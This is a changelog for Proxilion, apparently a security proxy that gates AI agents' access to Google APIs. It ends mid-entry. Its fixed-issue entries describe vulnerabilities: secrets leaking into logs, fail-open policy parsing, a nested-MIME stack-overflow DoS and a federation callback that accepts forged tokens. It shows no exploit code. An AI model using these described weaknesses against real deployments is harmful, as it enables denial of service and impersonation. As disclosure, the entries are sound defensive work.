# Changelog

All notable changes to Proxilion. Format follows
[Keep a Changelog](https://keepachangelog.com/en/1.1.0/); this project
follows [Semantic Versioning](https://semver.org/) once it reaches a
tagged `v0.1.0` (not yet — see [docs/specs/spec.md](docs/specs/spec.md)
§13 milestones).

Until v0.1.0, the canonical reference is the most recent commit on
`main` plus the deviation / status blocks in
[docs/specs/](docs/specs/).

---

## [Unreleased]

### Added

- **Wired the three declared-but-missing §7 observability series** (completes
  surface-delight-and-correctness.md §7 / §9 Phase 5 step 15). An audit found
  that of the five metrics that spec declares, only `proxilion_forwarder_retry_total`
  and `proxilion_burst_buckets` were actually emitted; the other three were
  documented but never wired. Closed:
  `proxilion_override_justification_present_total{surface,decision}` (emitted on
  every committed override in [api/blocked.rs](crates/proxy/src/api/blocked.rs)
  `approve_inner`/`reject_inner`, gated on non-empty justification — divided by
  `proxilion_overrides_resolved_total` it gives the per-surface "did the reviewer
  record *why*" fill rate);
  `proxilion_adapter_path_encoded_total{vendor}` (new
  [`adapters::encoded_segment`](crates/proxy/src/adapters/mod.rs) wrapper that the
  Drive/Gmail/Calendar production call sites route through, keeping the pure
  `path_segment` metric-free for its encoding unit tests); and
  `proxilion_policy_list_match_total{op,result}` (emitted on the §6.2 list-valued
  match path in [match_expr.rs](crates/policy-engine/src/match_expr.rs), proving
  the flagship external-send gate fires post-fix). The bundled Grafana dashboard
  ([ops/grafana/proxilion.json](ops/grafana/proxilion.json)) gained an "Approval
  quality & resource bounds" row with the override-justification fill-rate and
  burst-bucket panels.
- **Fixed a latent metric mislabel surfaced while wiring the above:**
  `reject_inner` hardcoded `channel="api"` on the pre-existing
  `proxilion_overrides_resolved_total` counter, so email/Slack rejects were
  miscounted as API rejects. Threading the real surface label through
  `reject_inner` corrects it.
- **Marketing site `/pic` explainer page** — completes spec.md §4.3 (the only
  playbook step that lacked a Status block). [site/pic/index.html](site/pic/index.html)
  is a standalone, no-build static page that explains the PIC protocol the spec
  asked for: the confused-deputy problem, the three invariants
  (Provenance / Identity / Continuity) as pillars + detail cards, an inline SVG
  PCA-chain diagram showing authority narrowing root→leaf with one *refused*
  escalation branch (`MonotonicityViolation`), the COSE_Sign1/CBOR/Ed25519
  encoding + Trust Plane roles, how Proxilion mints `PCA_0/1/2`, and a
  "what PIC does / does not promise" table. Attribution to **Nicola Gallo**
  ([pic-protocol.org](https://www.pic-protocol.org/),
  [clay-good/provenance](https://github.com/clay-good/provenance)) is the first
  content section. Reuses the homepage design system verbatim (dark-mode aware,
  full JSON-LD/OG/Twitter SEO surface); cross-linked from the homepage nav and
  added to [site/sitemap.xml](site/sitemap.xml). spec.md §4.3 now carries a
  Status block documenting the static-HTML-not-Astro deviation.
- **`ops/prometheus/prometheus.yml`** — a ready-to-use Prometheus scrape config
  for the proxy's `/metrics` endpoint, completing the operator-artifacts set
  (the `ops/prometheus/` directory existed but was empty, and the README repo
  tree already listed "Prometheus scrape config" as a deliverable). It carries
  the `proxilion` scrape job (matching the previously inline-only example), a
  production-TLS note, and an example Alertmanager rule for the must-be-zero
  `proxilion_pca_verify_failures_total` series. `ops/README.md` now points at
  this file as the canonical source instead of duplicating the YAML inline.
  [ops/prometheus/prometheus.yml](ops/prometheus/prometheus.yml)
- **`read_bounded` branch coverage completed** — the shared upstream-body cap
  helper added with the §1.4 streaming fix had tests only for the
  `Content-Length`-absent streaming path; its `Content-Length` *pre-check*
  branch was unexercised. Added `read_bounded_rejects_on_oversized_content_length_before_reading_body`
  (advertised length over cap → reject before reading a byte) and its
  within-cap complement, plus a signature-witness test pinning the
  `(reqwest::Response, usize) -> Result<Vec<u8>, AppError>` shape against an
  `anyhow`/borrowed-return refactor. [adapters/mod.rs](crates/proxy/src/adapters/mod.rs)
- **Action-log `purge` dry-run integration test** — completes the
  destructive-operation dry-run coverage (alongside `killswitch`).
  [api/actions.rs](crates/proxy/src/api/actions.rs)
  `db_backed_actions_purge_dry_run_counts_without_deleting_then_real_purge_deletes`
  pins the audit-retention purge against real SQL: `dry_run` counts old rows
  and changes nothing; the real purge deletes rows past the cutoff while recent
  rows survive; a future `older_than` is refused.
- **Action-log `list` API integration test** —
  [api/actions.rs](crates/proxy/src/api/actions.rs)
  `db_backed_actions_list_filters_and_cursor` pins the query backing
  `proxilion-cli actions list` + `policy simulate`: seeds `action_events` rows
  and asserts the `p_0` / `decision` / `action` filters and the `limit` +
  `next_before` cursor against real SQL.
- **README** — a per-request-hot-path Mermaid **sequence diagram**, a
  **threat-model** table (defended-by-PIC / defended-by-Proxilion / not-defended,
  from spec.md §10), and an **observability cheat sheet** of the key Prometheus
  series (verified against the metric names actually emitted).
- **OAuth federation state-binding integration test** (surface-delight §6.4) —
  the session-fixation/replay defense was unit-tested only on the pure
  comparator. [oauth/routes.rs](crates/proxy/src/oauth/routes.rs)
  `db_backed_bridge_callback_binds_session_on_match_and_rejects_replay` now
  drives `bridge_callback_body` against real SQL: a matching-`state` token
  writes `pca_0_id`/`p_0`/`granted_ops` to the session, while a token minted
  for a *different* session returns `BridgeRejected` and leaves the target
  session untouched (`pca_0_id` still NULL — the replay is blocked before the
  UPDATE).
- **Operator-auth boundary integration test** (ui-less-surfaces.md §4.4) — the
  authentication gate for the *entire* operator API (`/api/v1/*`:
  killswitch / blocked / policy / actions / …) was DB-backed but had no
  integration coverage. [operator_auth.rs](crates/proxy/src/operator_auth.rs)
  `db_backed_operator_auth_boundary_enforces_token_and_scope` drives the real
  `middleware` (DB `operator_tokens` lookup + revocation check + principal
  attach) composed with a per-route `scope_check`, via `tower::oneshot` against
  seeded tokens, pinning the full decision matrix: valid+scope → 200,
  wildcard → 200, revoked → 401, unknown → 401, wrong scope → 403,
  missing/malformed → 401 — plus the `last_used_at` touch on success.
- **Calendar write-gate integration test** (spec.md §2.1 / §8 / §9) —
  [google_calendar.rs](crates/proxy/src/adapters/google_calendar.rs)
  `db_backed_calendar_insert_external_attendee_is_blocked_403` exercises the
  Calendar adapter's distinguishing **write** path: `events.insert` with an
  external attendee is blocked at Layer B → `PolicyBlocked` (403) +
  `layer='policy'` blocked row, no Trust Plane / Google contacted. Completes
  integration coverage of all three adapters (Drive / Gmail / Calendar) on the
  shared `test_support` harness.
- **Concurrent-refresh coalescing integration test** (spec.md §1.1 deviation 3,
  the last "structural-not-integration" gap) —
  [auth_middleware.rs](crates/proxy/src/auth_middleware.rs)
  `db_backed_refresh_coalesces_50_concurrent_into_one_google_call` fires 50
  concurrent `refresh_with_coalescing` calls (same bearer, an expired seeded
  `google_tokens` row) at a **wiremock'd Google token endpoint** and asserts via
  `received_requests()` that Google is hit **exactly once** and all 50 callers
  get the fresh token — pinning the per-bearer `Arc<Mutex>` + post-lock DB
  re-read under real concurrency. Runs in the CI `integration` job.
- **Adapter happy-path + read-filter-block integration tests** — completes the
  `proxy_request` branch matrix on the wiremock'd harness:
  `..._valid_mint_caches_successor_and_passes_through` (Trust Plane *issues* a
  successor via the new `mock_trust_plane_issue` helper → the PCA_2 is cached at
  `hop=2` with the leaf as predecessor and a clean upstream body passes through)
  and `..._read_filter_block_request_quarantines_full_body_403` (the
  `block_request` action quarantines the whole response → `ReadFilterBlocked`
  (403) + a `layer='read_filter'` blocked row, distinct from the
  `replace_with_marker` path). The adapter core is now covered across allow /
  audit-fallback / valid-mint / mint-refused / Layer-B-block.
- **Adapter block-path integration tests** (spec.md §1.3 / §1.5 / §9, the last
  two deferred wire-level scenarios) — both build on the wiremock'd harness:
  `db_backed_drive_get_runtime_gate_forced_ops_mismatch_is_blocked_403` proves
  the runtime-gate guarantee (Trust Plane 422 → `PicInvariantViolation` (403),
  upstream never reached, `layer='pic_invariant'` blocked row persisted), and
  `db_backed_gmail_send_external_recipient_is_blocked_403` proves the flagship
  external-send gate (Layer-B `PolicyBlocked` (403) + `layer='policy'` blocked
  row with `policy_id` + `override_allowed`, no Trust Plane / Google contacted).
  Shared scaffolding (`adapter_state`, `mock_session`, `mock_trust_plane_reject`)
  extracted to [test_support.rs](crates/proxy/src/test_support.rs); the existing
  Drive read-filter test was refactored onto it.
- **End-to-end Drive adapter integration test** (spec.md §1.3 "read filter
  triggers → marker present", the long-deferred wiremock'd-Google scenario) —
  [google_drive.rs](crates/proxy/src/adapters/google_drive.rs)
  `db_backed_drive_get_audit_mode_read_filter_quarantines_injection` drives the
  whole `proxy_request` path: policy eval → PIC mint against a **wiremock'd
  Trust Plane** (422 → `audit` fallback, no real crypto) → upstream GET to a
  **wiremock'd Google** (via the `google_api_base` override) → read-filter
  quarantine. Asserts the injection pattern is replaced by `read_filter::MARKER`
  while surrounding text passes through. Runs in the CI `integration` job
  (postgres service); skips locally without `PROXILION_TEST_DATABASE_URL`.
- **CI now runs the DB-backed integration tests** — a new `integration` job in
  [.github/workflows/ci.yml](.github/workflows/ci.yml) provisions a
  `postgres:16-alpine` service and sets `PROXILION_TEST_DATABASE_URL`, so the
  opt-in DB-backed tests execute (not skip) on every push. The job is
  independent of `fmt`/`clippy`/`test`/`build-release`. Also extended the
  harness with a **blocked-queue** test (`list` status/policy filters, the
  auto-expire-on-list of past-due pending rows, and `show` → 404 on unknown id),
  verified locally against `postgres:16`.
- **DB-backed integration tests** ([crates/proxy/src/test_support.rs](crates/proxy/src/test_support.rs))
  — the long-deferred end-to-end harness (spec.md §1.1 deviation 3), now seeded.
  Because the proxy is a binary-only crate, these live as in-module
  `#[cfg(test)]` tests that drive private handlers against a real Postgres
  (migrated via `sqlx::migrate!`). They are **opt-in**: each returns early
  unless `PROXILION_TEST_DATABASE_URL` is set, so the default `cargo test`
  run and CI skip them and stay hermetic/green. Two security-critical flows
  are covered end-to-end: the `notifier_public` email approval landing (the
  single-use token is consumed only on **POST**, never on a prefetch GET —
  §4.1) and the `killswitch` `--dry-run` (the preview `count(*)` matches the
  real revoke exactly, with no state change and no `kill_records` row — §3.3).
  Verified locally against `postgres:16`. Wiring a Postgres `services:` block
  into CI to run them on every push is the documented next step.
- **Slack approve/reject justification modal** (surface-delight-and-correctness.md
  §4.1, audit-critical) — when a Slack **bot** token is set
  (`PROXILION_SLACK_BOT_TOKEN`), an Approve/Reject click calls `views.open`
  to show a Block Kit modal capturing the reviewer's justification, and the
  override commits on `view_submission` with that text (replacing the
  synthesized "approved via Slack by …" string), enforcing the same ≥ 20-char
  minimum as the email form. **Graceful degradation:** with no bot token the
  original direct-commit path is unchanged, so incoming-webhook-only installs
  are unaffected — the token lives in the env, not the `notifier_config` row,
  so there is no schema/struct/pin change. Pure helpers (modal JSON,
  `view_submission` parse + round-trip) and the `views.open` call (via
  wiremock) are unit-tested. This completes the surface-delight spec's §4.
- **CLI: `--color auto|always|never`** (surface-delight-and-correctness.md
  §3.2) — a global flag gating all ANSI output, honoring `NO_COLOR` and
  non-TTY pipes. The four `const` SGR codes were replaced with a runtime-gated
  `colors()` tuple resolved once from a pure, unit-tested `resolve_color`
  decision; every styled site binds the subset it needs so format strings are
  untouched.
- **CLI: `--dry-run` on destructive commands** (§3.3) — `killswitch
  session|user|all` and `clients revoke` preview the blast radius (count of
  bearers/clients that *would* be revoked) without changing anything
  (`actions purge --dry-run` already existed). Killswitch previews use a
  **server count** (`SELECT count(*)` against the same predicate as the real
  revoke) so the preview matches execution with no TOCTOU gap — no UPDATE, no
  `kill_records` row, no cache write.
- **CLI: progress feedback** (§3.5) — `actions export` and `policy simulate`
  show a throttled single-line stderr progress indicator (bytes/rows +
  elapsed), suppressed under `--format json`, a piped stderr, or
  `--color never`. No new dependency.

### Fixed

- **Drive adapter dropped the review row + notifier on a `require_confirmation`
  policy** (a twelfth-audit-pass finding, 2026-06-15). All three Google adapters'
  `proxy_request` share a Layer-B denial template that persists a
  `blocked_actions` row and fires the human-in-the-loop notifier, but the guard
  was inlined in each copy and drifted: Gmail and Calendar matched both
  `PolicyBlocked` *and* `RequireConfirmation`, while the Drive copy matched only
  `PolicyBlocked`. So a `decision: require_confirmation` policy on a Drive read
  (`drive.files.list` / `get` / `export`) denied the agent correctly (428) but
  wrote **no** reviewable row and fired **no** email/Slack notification — there
  was nothing for an operator to approve, and the action went uncounted — while
  the identical rule on Gmail or Calendar produced the full pending-block record.
  The decision was right; the audit/operator surface was wrong-by-adapter. Fixed
  by extracting the guard into one shared
  [`adapters::persists_blocked_action`](crates/proxy/src/adapters/mod.rs) predicate
  that all three `proxy_request` bodies now call, so the three can no longer
  diverge (the same consolidation the read-filter `read_bounded` fix used). New
  regression tests: a context-free unit test
  (`persists_blocked_action_covers_both_layer_b_denials_and_nothing_else`) pinning
  the predicate across every `AppError` variant, and a DB-backed integration test
  (`db_backed_drive_get_require_confirmation_persists_pending_blocked_row`)
  asserting a `require_confirmation` Drive read writes exactly one `status='pending'`,
  `layer='policy'` row end-to-end (it fails on the pre-fix guard). MEDIUM (a
  human-in-the-loop gate on Drive reads was silently unreviewable and uncounted).
- **Read-filter `quarantine_action` could silently fail open** (an
  eleventh-audit-pass finding, 2026-06-15). `PolicyDoc` carries
  `#[serde(deny_unknown_fields)]` (so a typo'd top-level key fails loudly), but
  the tenth-pass fix was never extended to the *nested* config structs. A
  misspelled `quarantine_actoin: block_request` under a `read_filter:` block was
  therefore silently dropped, and `quarantine_action` fell back to its
  `replace_with_marker` default — downgrading an operator's intended *hard block*
  of an injected upstream response to a marker-splice that still reaches the
  agent. `Engine::validate` (behind `policy validate`) runs *after* the unknown
  key is gone, so it green-lit the broken policy. Fixed by adding
  `#[serde(deny_unknown_fields)]` to `ReadFilterCfg` (plus `RecipientsCfg` and
  `BurstCfg` for the same silent-drop footgun on `escalation_after_minutes` /
  `threshold` / `window_seconds`) in
  [policy-engine/src/yaml.rs](crates/policy-engine/src/yaml.rs). New regression
  test `read_filter_cfg_rejects_unknown_keys_so_a_typod_action_cant_fail_open`.
  MEDIUM (fail-open on the read-filter response-quarantine control).
- **`proxilion-cli` could panic on an absurd `--since` / `--against` duration**
  (an eleventh-audit-pass finding, 2026-06-15). The fifth pass switched
  `parse_window`/`parse_since` to chrono's checked `try_*` *constructors*, but
  the subsequent `chrono::Utc::now() - dur` subtraction is a *separate* overflow
  surface: `DateTime - TimeDelta` is `expect`-on-`checked_sub_signed` in chrono,
  so a magnitude that builds a valid `Duration` (chrono's `TimeDelta` spans
  ~106e9 days) yet pushes the date past `NaiveDate`'s ±262k-year range — e.g.
  `actions purge --older-than 100000000d`, `policy simulate --against
  last-100000000d` — aborted the CLI with `'DateTime - TimeDelta' overflowed`
  instead of the intended friendly error. Fixed by subtracting via
  `checked_sub_signed` and surfacing the existing overflow error
  ([cli/src/main.rs](crates/cli/src/main.rs) `parse_window`/`parse_since`). New
  regression tests `parse_window_rejects_overflowing_magnitude_without_panicking`
  (extended) and `parse_since_rejects_subtraction_overflow_without_panicking`.
  LOW (operator-local CLI panic, no server impact). The crypto/auth/oauth,
  notifiers/forwarders/PIC/operator-API lanes were swept again and cleared with
  no findings.
- **Capability-URL secrets leaked into logs** (a tenth-audit-pass finding,
  2026-06-15). A Slack incoming-webhook URL carries its token *in the path*
  (`hooks.slack.com/services/T…/B…/XXXX`), and generic-webhook / SIEM URLs may
  carry auth in path/query, NATS URLs `user:pass@` userinfo. Two leak classes:
  (a) transport-error logs formatted a `reqwest::Error` with `%e`, and reqwest's
  `Display` appends ` for url (…)` — so any DNS/connect/TLS failure wrote the
  full secret-bearing endpoint into a WARN line
  ([notifier/slack.rs](crates/proxy/src/notifier/slack.rs),
  [notifier/webhook.rs](crates/proxy/src/notifier/webhook.rs),
  [forwarder/siem.rs](crates/proxy/src/forwarder/siem.rs)); (b) boot-time
  `info!(url = %url, …)` lines logged the raw endpoint *unconditionally* on every
  start ([server.rs](crates/proxy/src/server.rs): webhook/Slack/SIEM/NATS
  installs). Fixed by stripping the URL from transport errors via
  `reqwest::Error::without_url()` and routing every boot log through a new
  [`config::redacted_endpoint`](crates/proxy/src/config.rs) helper that renders
  only `scheme://host[:port]` (userinfo/path/query dropped; unparseable input →
  a fixed placeholder, never echoed). New test
  `redacted_endpoint_strips_secret_bearing_url_parts`. MEDIUM (secret exposure to
  log aggregation/SIEM).
- **`proxilion-cli policy validate` under-validated — it green-lit policies the
  engine rejects at runtime** (a tenth-audit-pass finding, 2026-06-15). The
  command ran only `yaml::parse_policies` (a YAML-shape check), so a bad
  read-filter regex, an unknown `decision`, or a typo'd match operator
  (`equls:`) passed `✓ valid` with exit 0 — then hard-denied (500, fail-closed)
  every matching request on deploy. Worse, the runtime error page literally
  tells operators to run `policy validate` to catch exactly that class. Fixed by
  adding [`Engine::validate`](crates/policy-engine/src/rego.rs) (compiles every
  policy's decision shape + read-filter regexes) and a context-free, every-branch
  [`match_expr::validate`](crates/policy-engine/src/match_expr.rs) (operator
  vocabulary + literal regex/threshold compilation, lenient on `${…}`-templated
  values), wired into the CLI. New tests
  `engine_validate_compiles_decision_read_filter_and_match_beyond_parse` and the
  `validate_*` match-expr suite. MEDIUM (operator-trust / availability).
- **Two fail-open shapes hardened to fail closed** (a tenth-audit-pass finding,
  2026-06-15). (a) `PolicyDoc` lacked `#[serde(deny_unknown_fields)]`, so a
  fat-fingered key (`decison: block`) silently dropped to the permissive default
  — `decision` Null → `Allow`, `match` Null → match-everything — turning an
  intended block policy into match-everything allow that `Engine::validate`
  cannot catch (a Null decision is a *valid* Allow). Now rejected at parse time
  ([yaml.rs](crates/policy-engine/src/yaml.rs); test
  `policy_doc_rejects_unknown_keys_so_a_typod_field_cant_fail_open`). (b) The
  PCA-cache `get` decoded a malformed `ops` JSONB with `unwrap_or_default()` → an
  *empty* op set, which is a subset of every authority — a monotonicity-bypass
  shape the moment any caller trusts `cached.ops`. Now a new
  `CacheError::Decode` fails the lookup closed
  ([pic/cache.rs](crates/proxy/src/pic/cache.rs)), surfacing as `AuthFail::Other`
  (401) in the auth middleware. LOW (defense-in-depth; neither reachable as an
  exploit today).
- **`proxilion-cli actions tail` SSE reassembly buffer was unbounded** (a
  tenth-audit-pass finding, 2026-06-15). The live-tail loop appended decoded
  bytes to `buf` and only drained on a `\n\n` frame delimiter, so a server (or an
  on-path peer of the long-lived SSE connection) that streamed bytes without ever
  emitting a delimiter grew `buf` until the operator's CLI OOM'd — the proxy
  bounds its own upstream reads at 10 MB but the client had no analog. Bounded at
  10 MB with a clean bail ([cli/src/main.rs](crates/cli/src/main.rs)). LOW
  (client-side DoS).
- **Federation-bridge signature stub now warns loudly at boot.** `/oauth/bridge/
  callback` trusts the federation token *payload* without verifying its signature
  (M0/M1 — upstream `provenance-bridge` has no binary target; spec.md §0.4), so
  anyone reaching it could forge `p_0`/`ops`. The stub shipped with no runtime
  signal. It now emits a loud `warn!` whenever the OAuth router is mounted
  ([server.rs](crates/proxy/src/server.rs)), mirroring the
  `PROXILION_DISABLE_OPERATOR_AUTH` posture, so the documented pre-production gap
  can never ship silently. (Full JWKS verification remains the upstream-blocked
  swap; spec.md §15 #2.)
- **Docs drift in [ui-less-surfaces.md](docs/specs/ui-less-surfaces.md)** (a
  tenth-audit-pass finding): a SQL block mis-captioned `0005_operator_tokens.sql`
  (it is `0006`); copy-pasteable CLI examples using flags that don't exist
  (`actions export --compress`, `actions tail --output`/`--filter`, `blocked list
  --pending --since`, `killswitch revoke`, `--endpoint`/`$PROXILION_ENDPOINT`)
  corrected to the real surface (`--format`, `--decision`, `--status`,
  `killswitch user`, `--url`/`$PROXILION_URL`); and a fictional
  `PROXILION_METRICS_EXPORTER`/OTLP env var replaced with the actual
  Prometheus-on-`/metrics` story.
- **`proxilion-cli actions tail` dropped a whole SSE chunk on a multibyte
  codepoint split across a TCP fragment boundary** (a ninth-audit-pass finding,
  2026-06-15). The live-tail loop in [cli/src/main.rs](crates/cli/src/main.rs)
  `actions_tail` decoded each `bytes_stream()` chunk with
  `std::str::from_utf8(&chunk).unwrap_or("")` — so whenever a chunk *ended*
  mid-codepoint (which TCP fragmentation does at arbitrary byte offsets) the
  **entire chunk** decoded to `""` and every SSE frame's worth of bytes in it
  was silently discarded, not just the split character. The trigger is exactly
  the international content this proxy gates: an action event whose filename,
  subject, or attendee name contains a multibyte UTF-8 char (`日本語`, `café`,
  emoji) garbles or vanishes from the operator's live tail. Fixed by buffering
  raw bytes across chunks and decoding only the longest valid-UTF-8 *prefix* via
  the new pure `decode_utf8_streaming` helper, which retains an incomplete
  trailing sequence for the next chunk and skips genuinely-invalid bytes without
  stalling. Display-only (the `--format json|ndjson` pipe paths and all
  persisted data are unaffected), so LOW severity — but a real correctness loss
  on the human-facing surface. New regression tests
  `decode_utf8_streaming_reassembles_codepoint_split_across_chunks` and
  `decode_utf8_streaming_skips_genuinely_invalid_bytes_without_stalling`. The
  other three sweep lanes (crypto/auth/oauth, adapters/MIME/policy-engine,
  notifiers/forwarders/PIC/operator-API) were re-audited and cleared with no
  findings. LOW (display correctness).
- **`POST /api/v1/notifier/test` gated on an orphaned, off-catalogue scope**
  (an eighth-audit-pass finding, 2026-06-15). [api/notifier.rs](crates/proxy/src/api/notifier.rs)
  `router` gated the notifier-test route on the string `"notifier:test"`, which
  exists **nowhere** in the canonical operator-scope catalogue
  ([shared-types/src/operator_scopes.rs](crates/shared-types/src/operator_scopes.rs)),
  the CLI, or the spec — the catalogue and `ui-less-surfaces.md` §8.3 both
  document `/test` as covered by `notifier:write`. `scope_check`
  ([operator_auth.rs](crates/proxy/src/operator_auth.rs)) passes only on an exact
  scope match or the `*` wildcard, and `tokens issue` only ever mints catalogued
  scopes, so the effect was a **least-privilege inversion**: an operator holding
  the documented `notifier:write` scope got **403** on the flagship
  "verify-your-wiring" endpoint, while the only principals that could reach it
  were wildcard `*` admin tokens — the opposite of least privilege. Fixed by
  gating `/test` on `notifier:write` (matching the catalogue) and routing all
  four notifier-router gates through named `*_SCOPE` constants. New regression
  test `router_scope_gates_are_all_catalogued` fails if any gate drifts off the
  canonical catalogue again. The other three sweep lanes (crypto/auth/oauth,
  adapters/MIME/policy-engine, notifiers/forwarders/PIC/operator-API) were
  re-audited and cleared with no findings. MEDIUM (authz / least-privilege).
- **Silently-disabled numeric deny gate when a `greater_than`/`less_than`
  threshold is YAML-quoted** (a seventh-audit-pass finding, 2026-06-15).
  [match_expr.rs](crates/policy-engine/src/match_expr.rs) `apply_op` read the
  policy-authored threshold only via `rhs.as_f64().or_else(as_i64)`, so a quoted
  threshold (`greater_than: "100"`, which `serde_yaml` deserializes to a
  `String`, not a `Number`) coerced to `None` and the whole comparison fell
  through to `Ok(false)` — the deny condition **never matched**, so a gate an
  operator believed was blocking (e.g. "block if `recipient_count` >
  threshold") silently allowed every request. The RHS is policy config, not
  runtime data, so a non-numeric threshold is an authoring error: it now fails
  **closed** as a `MatchError::BadShape` — which every adapter's
  `evaluate_with_trace` error arm turns into a request rejection
  ([google_gmail.rs](crates/proxy/src/adapters/google_gmail.rs) `Err(e) =>
  return Err(e.into())`) — exactly mirroring how the `matches` operator already
  `BadShape`-errors on a malformed RHS. A *numeric* string is now accepted as
  the number it plainly denotes (the common quoting slip just works). The LHS
  (the runtime request value) is unchanged: a non-numeric value still degrades
  gracefully to "no match" (it's data, not config), pinned by the existing
  `{greater,less}_than_non_numeric_lhs` tests. New regression coverage:
  `greater_than_quoted_numeric_threshold_is_accepted` (quoted `"5"`/`"10"`
  compare numerically; quoted `"99"` agrees with the unquoted no-match) and
  `greater_than_non_numeric_threshold_is_bad_shape_not_silent_false` (a
  non-numeric / boolean threshold errors fail-closed). The other three sweep
  lanes (adapters/MIME, crypto/PIC/oauth/auth, notifiers/forwarders/config/CLI)
  were re-audited and cleared with no findings. MEDIUM.
- **Reachable panic in the Slack `[Why?]` handler on attacker-influenced
  multibyte request snapshots** (a sixth-audit-pass finding, 2026-06-15).
  [api/notifier_slack.rs](crates/proxy/src/api/notifier_slack.rs) `handle_why`
  capped the embedded request snapshot with a raw byte slice
  `&s[..SLACK_REQ_CAP]` (2 KB). The snapshot is `blocked_actions
  .request_canonical_json` — the agent's own request body (a Drive filename,
  Gmail subject, calendar title, …), capped at 4 KB so it routinely exceeds the
  2 KB Slack cap and carries arbitrary UTF-8. Whenever byte 2048 fell
  mid-codepoint the slice panicked (`byte index … is not a char boundary`),
  aborting the handler future (no `CatchPanicLayer`, so the connection is reset)
  on every affected blocked row — an operator gets a request with non-ASCII
  content blocked, then a reviewer clicking **[Why?]** breaks the button. Fixed
  by truncating on a char boundary via a pure, unit-tested `cap_request_snippet`
  helper (matching the char-safe `truncate` already in `notifier/slack.rs`).
  Pinned by `cap_request_snippet_truncates_multibyte_without_panicking` (+ the
  short-input passthrough). MEDIUM.
- **Unbounded `multipart/*` recursion in Gmail send could overflow a worker
  stack** (a sixth-audit-pass finding, 2026-06-15).
  [adapters/google_gmail.rs](crates/proxy/src/adapters/google_gmail.rs)
  `parse_mime` handed the agent-supplied `raw` MIME straight to
  `mailparse::parse_mail`, whose `parse_mail_recursive` descends into every
  `multipart/*` subpart with no depth bound. A payload nesting containers tens of
  thousands deep (well within axum's 2 MB body limit at ~40 bytes/level)
  overflows the tokio worker thread's stack *during parsing* — before our own
  `count_parts` walk — crashing the worker and dropping its in-flight
  connections (DoS-of-degree). Added a cheap single-scan guard
  (`count_multipart_markers`): every container the parser recurses into carries a
  `Content-Type: multipart/...` marker, so the marker count upper-bounds the
  recursion depth; we reject past `MAX_MIME_MULTIPART = 100` (far above any real
  message — mixed › alternative › related is depth 3) **before** invoking the
  recursive parser. Fails closed, the safe direction for a gating proxy; mirrors
  the existing `MAX_SAMPLES` / `MAX_CHAIN_HOPS` bounds. Pinned by
  `parse_mime_rejects_pathologically_nested_multipart_before_overflow` (+ a
  realistically-nested accept test and `count_multipart_markers` unit coverage).
  LOW/MEDIUM.
- **CLI `urlencode` mis-encoded every non-ASCII character, silently breaking
  `killswitch user <p_0>` for internationalized principals** (a fifth-audit-pass
  finding, 2026-06-15). [crates/cli/src/main.rs](crates/cli/src/main.rs)
  `urlencode` emitted `format!("%{:02X}", c as u32)` — the Unicode *scalar
  value* rather than the UTF-8 *bytes* RFC 3986 requires. `é` (U+00E9) became the
  lone invalid byte `%E9`; `日` (U+65E5) became the malformed four-hex-digit
  `%65E5`. The proxy decodes these with axum's standard `Path<String>`/query
  extractors, so a non-ASCII `p_0` either 400'd or matched no principal — meaning
  a `killswitch user` against an internationalized principal (the project's own
  `session.rs` ships tests for `日本語ユーザー@example.co.jp`) **silently did
  nothing**, with the same hazard on every other id/query path
  (`actions list --p_0`, `pca`, `verify`, `blocked show/approve/reject`, …).
  Fixed to percent-encode the UTF-8 bytes. Pinned by
  `urlencode_encodes_utf8_bytes_not_scalar_value` (the prior test only exercised
  ASCII). HIGH.
- **Read-filter quarantine samples grew without bound, one DB INSERT per match.**
  [adapters/read_filter.rs](crates/proxy/src/adapters/read_filter.rs) `apply`
  pushed a `QuarantineSample` (cloned pattern + snippet string) per regex match
  with no cap, and each sample becomes one serial `quarantined_payloads` INSERT
  in the Drive/Gmail/Calendar `persist_quarantine_samples` loops. `should_scan`
  deliberately scans `application/json` — exactly what every Google API returns —
  so a short operator pattern (e.g. `\bpassword\b`) against a cap-compliant 10MB
  body the agent can influence could fan out into millions of allocations and
  serial inserts (resource-exhaustion DoS). Capped retained samples at
  `MAX_SAMPLES = 100` while keeping `FilterOutcome::matches` exact for the audit
  roll-up. Pinned by `samples_are_capped_while_match_count_stays_exact`. MEDIUM.
- **CLI `policy simulate --against last-<N><unit>` panicked on an overflowing
  magnitude.** [crates/cli/src/main.rs](crates/cli/src/main.rs) `parse_window`
  built durations with `chrono::Duration::days`/`hours`/`minutes`/`seconds`,
  which *panic* on internal overflow — so an i64-parseable but absurd value
  (`last-200000000000000d`) crashed the CLI instead of returning the helpful
  error the function otherwise produces. Switched to the checked `try_*`
  constructors, mirroring the sibling `parse_since`'s `Duration::from_std` guard.
  Pinned by `parse_window_rejects_overflowing_magnitude_without_panicking`. LOW.
- **`POST /api/v1/blocked/{id}/approve` documented a `ttl_minutes` override
  lifetime it never applied — made the contract honest.**
  [api/blocked.rs](crates/proxy/src/api/blocked.rs) `ApproveBody.ttl_minutes` was
  documented "default 30m from now, caps at 24h" and bounds-validated `1..=1440`,
  but `mint_successor` takes no expiry and `pca_cache` has no `expires_at` column,
  so the value was a no-op — an operator who set a TTL to bound an override got
  one whose real lifetime is governed by the PCA chain, not their request.
  Rather than ship a half-wired security control, the field docstring now states
  it is accepted-but-not-yet-enforced and points at the tracking item; the
  misleading unit test (which claimed the handler "interprets 0 as no TTL" — it
  actually *rejects* 0) was corrected. Proxy-side TTL enforcement is tracked in
  surface-delight-and-correctness.md §10 (same upstream
  `successor-with-attestation` blocker as the spec.md §6.6 override branch).
- **`GET /api/v1/notifier/config` leaked the cleartext webhook / Slack
  incoming-webhook URL to `notifier:read` operators** (a fourth-audit-pass
  finding, 2026-06-15). The handler
  ([api/notifier.rs](crates/proxy/src/api/notifier.rs) `get_config`) redacted
  `smtp_url` correctly but the webhook and Slack branches *inserted* the
  redacted twin (`url_redacted` / `incoming_webhook_url_redacted`) while
  leaving the original cleartext key in the response. A Slack incoming-webhook
  URL and a `?token=`-bearing generic webhook URL are themselves bearer
  credentials — possession alone lets you post into the customer's alert
  channel — so a read-only operator was handed a postable secret. The three
  hand-rolled redaction branches (whose divergence caused the leak) are now a
  single pure `redact_notifier_config(cfg, secret_fields, url_fields)` helper
  that removes every secret-bearing field. Pinned by
  `redact_notifier_config_strips_url_borne_secrets_for_every_driver`.
- **Env-var-unset silently clobbered file-configured SIEM / NATS / blocked-webhook
  settings.** In [config.rs](crates/proxy/src/config.rs) `from_env_layer`, five
  `Option`-valued fields (`nats_url`, `siem_webhook_url`, `siem_hmac_key_hex`,
  `blocked_webhook_url`, `blocked_webhook_hmac_key_hex`) used an *unconditional*
